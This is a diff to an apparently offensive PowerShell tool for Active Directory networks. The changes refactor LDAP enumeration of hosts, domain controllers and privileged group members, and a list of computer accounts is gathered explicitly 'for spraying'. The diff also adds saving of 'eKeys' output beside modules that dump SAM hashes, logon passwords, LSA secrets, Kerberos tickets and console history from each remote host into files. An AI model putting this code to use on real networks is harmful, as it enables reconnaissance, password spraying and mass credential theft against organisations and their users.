@@ -263,49 +263,47 @@ $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
 $searcher.PageSize = 1000
 $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
 
-if ($Targets -eq "Workstations") {
-    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-}
-elseif ($Targets -eq "Servers") {
-    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-}
-elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-    $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $computers = $searcher.FindAll()
-}
-elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
-}
-
-elseif ($Targets -is [string]) {
-    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
-    if ($ipAddress) {
-        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
+# Pre-determine filter based on Targets
+switch ($Targets) {
+    "Workstations" {
+        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(operatingSystem=*server*)))"
+    }
+    "Servers" {
+        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    }
+    {$_ -in @("DC", "DCs", "DomainControllers", "Domain Controllers")} {
+        $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    }
+    {$_ -in @("All", "Everything")} {
+        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    }
+    {$_ -is [string]} {
+        $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
+        if ($ipAddress) {
+            Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
+            break
+        }
+        else {
+            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*))"
+            
+            if ($Targets -notlike "*.*") {
+                $Targets = $Targets + "." + $Domain
+            }
+            
+            $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
+            break
+        }
+    }
+    default {
+        Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
         break
     }
-    else {
-        $directoryEntry = [ADSI]"LDAP://$domain"
-        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*))"
-        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
-        
-        if ($Targets -notlike "*.*") {
-            $Targets = $Targets + "." + $Domain
-        }
-        
-        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
-    }
 }
 
-
-else {
-    Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
-    break
+# Fetch the results based on the filter if not already fetched
+if (-not $computers) {
+    $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
 }
-
 # Dispose the searcher after use
 $searcher.Dispose()
 
@@ -315,90 +313,72 @@ $searcher.Dispose()
 ############################ Grab interesting users for various parsing functions ##############################
 ################################################################################################################
 
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+# Create a searcher object with a common setup
+function New-Searcher {
+    $directoryEntry = [ADSI]"LDAP://$domain"
+    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+    $searcher.PageSize = 1000
+    return $searcher
+}
+
+# Fetch enabled users
+$searcher = New-Searcher
 $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
-
 $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+
 $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
-$EnabledDomainUsers = $users | ForEach-Object {
-    $_.Properties["samAccountName"][0]
+$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+# Fetch members of a group
+function Get-GroupMembers {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$GroupName
+    )
+
+    $searcher = New-Searcher
+    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
+    $searcher.PropertiesToLoad.AddRange(@("member"))
+    $groups = $searcher.FindAll()
+
+    $members = @()
+
+    foreach ($group in $groups) {
+        $group.Properties["member"] | ForEach-Object {
+            $userDN = $_.ToString()
+            $user = [ADSI]"LDAP://$userDN"
+            $samAccountName = $user.Properties["samaccountname"] -as [array]
+            if ($samAccountName) {
+                $members += $samAccountName[0]
+            }
+        }
+    }
+    
+    return $members
 }
 
-$DomainAdminGroupName = "Domain Admins"
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.Filter = "(&(objectCategory=group)(cn=$DomainAdmingroupName))"
-$searcher.PropertiesToLoad.AddRange(@("member"))
-$group = $searcher.FindOne()
-
-$DomainAdmins = $group.Properties["member"] | ForEach-Object {
-    $userDN = $_.ToString()
-    $user = [ADSI]"LDAP://$userDN"
-    $userProperties = $user.Properties.PropertyNames
-    $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
-    $user.Properties[$samAccountName][0]
-}
-
-try {
-$EnterpriseAdminGroupName = "Enterprise Admins"
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.Filter = "(&(objectCategory=group)(cn=$EnterpriseAdminGroupName))"
-$searcher.PropertiesToLoad.AddRange(@("member"))
-$group = $searcher.FindOne()
-
-$EnterpriseAdmins = $group.Properties["member"] | ForEach-Object {
-     $userDN = $_.ToString()
-     $user = [ADSI]"LDAP://$userDN"
-     $userProperties = $user.Properties.PropertyNames
-     $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
-     $user.Properties[$samAccountName][0]
-    }
-} Catch {}
-
-try{
-
-$ServerOperatorsGroupName = "Server Operators"
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.Filter = "(&(objectCategory=group)(cn=$ServerOperatorsGroupName))"
-$searcher.PropertiesToLoad.AddRange(@("member"))
-$group = $searcher.FindOne()
-
-$ServerOperators = $group.Properties["member"] | ForEach-Object {
-    $userDN = $_.ToString()
-    $user = [ADSI]"LDAP://$userDN"
-    $userProperties = $user.Properties.PropertyNames
-    $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
-    $user.Properties[$samAccountName][0]
-    }
-} Catch {}
-
-try {
-$AccountOperatorsGroupName = "Account Operators"
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.Filter = "(&(objectCategory=group)(cn=$AccountOperatorsGroupName))"
-$searcher.PropertiesToLoad.AddRange(@("member"))
-$group = $searcher.FindOne()
-
-$AccountOperators = $group.Properties["member"] | ForEach-Object {
-    $userDN = $_.ToString()
-    $user = [ADSI]"LDAP://$userDN"
-    $userProperties = $user.Properties.PropertyNames
-    $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
-    $user.Properties[$samAccountName][0]
-    }
-} Catch {}
+$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
+$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
+$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
+$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
 
 # Grab Computer Accounts for spraying
+function Get-ComputerAccounts {
+    $searcher = New-Searcher
+    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
+    
+    try {
+        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
+        return $ComputerSamAccounts
+    } catch {
+        Write-Error "Failed to fetch computer accounts. Error: $_"
+        return $null
+    }
+}
 
-$directoryEntry = [ADSI]"LDAP://$domain"
-$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
-$searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
-$ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
+$ComputerSamAccounts = Get-ComputerAccounts
+$searcher.Dispose()
 
 
 if (!$LocalAuth){
@@ -1491,6 +1471,7 @@ do {
                 if ($Module -eq "SAM"){$result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"}
                 if (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){$result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"}
                 if ($Module -eq "Tickets"){$result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"}
+                if ($Module -eq "eKeys"){$result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"}
                 if ($Module -eq "KerbDump"){$result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"}
                 if ($Module -eq "LSA"){$result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"}
                 if ($Module -eq "ConsoleHistory"){$result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"}
@@ -1996,6 +1977,7 @@ do {
             if ($Module -eq "SAM"){$result | Out-File -FilePath "$SAM\$($runspace.ComputerName)-SAMHashes.txt" -Encoding "ASCII"}
             if (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){$result | Out-File -FilePath "$LogonPasswords\$($runspace.ComputerName)-RAW.txt" -Encoding "ASCII"}
             if ($Module -eq "Tickets"){$result | Out-File -FilePath "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" -Encoding "ASCII"}
+            if ($Module -eq "eKeys"){$result | Out-File -FilePath "$eKeys\$($runspace.ComputerName)-eKeys.txt" -Encoding "ASCII"}
             if ($Module -eq "KerbDump"){$result | Out-File -FilePath "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" -Encoding "ASCII"}
             if ($Module -eq "LSA"){$result | Out-File -FilePath "$LSA\$($runspace.ComputerName)-LSA.txt" -Encoding "ASCII"}
             if ($Module -eq "ConsoleHistory"){$result | Out-File -FilePath "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" -Encoding "ASCII"}
